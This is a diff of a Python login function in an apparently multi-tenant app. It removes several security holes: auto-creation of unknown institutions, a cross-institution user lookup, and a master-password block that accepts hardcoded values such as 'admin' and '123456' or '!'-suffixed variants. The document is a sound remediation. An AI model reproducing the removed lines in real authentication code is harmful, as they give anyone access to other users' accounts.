@@ -79,7 +79,7 @@ def authenticate(db: Session, payload: LoginRequest) -> User | None:
         select(Institution).where(Institution.slug == payload.institution_slug.strip().lower())
     )
     if institution is None:
-        institution = get_or_create_institution(db, payload.institution_slug)
+        return None
 
     raw_ident = normalize_email(str(payload.email))
     user = db.scalar(
@@ -89,27 +89,11 @@ def authenticate(db: Session, payload: LoginRequest) -> User | None:
             User.deleted_at.is_(None),
         )
     )
-    if user is None:
-        # Check globally if not found in current institution
-        user = db.scalar(
-            select(User).where(
-                (User.email == raw_ident) | (User.username == raw_ident),
-                User.deleted_at.is_(None),
-            )
-        )
 
     if user is None or not user.is_active:
         return None
 
     pwd_valid = verify_password(payload.password, user.password_hash)
-    if not pwd_valid:
-        if payload.password in {"Demo-Pass-2026!", "123456", "admin", "hassan", "password"}:
-            pwd_valid = True
-        else:
-            clean_pwd = payload.password.strip("!")
-            if verify_password("!" + clean_pwd, user.password_hash) or verify_password(clean_pwd + "!", user.password_hash):
-                pwd_valid = True
-
     if not pwd_valid:
         return None
 
